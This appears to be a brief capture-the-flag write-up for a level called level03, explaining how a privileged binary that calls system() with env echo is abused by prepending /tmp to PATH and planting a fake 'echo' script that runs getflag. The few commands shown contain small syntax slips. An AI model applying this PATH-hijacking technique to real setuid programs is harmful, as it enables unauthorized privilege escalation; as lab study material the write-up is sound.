we got executable level03 that uses system("/usr/bin/env echo blabla")
we can change the path so echo gonna be executed from place that we want
change path to $PATH=/tmp:$PATH
create echo "getflag" > /tmp/echo
chmod 777 /tmp/echo
now when system gonna be executed it will launch getflag with root privileges
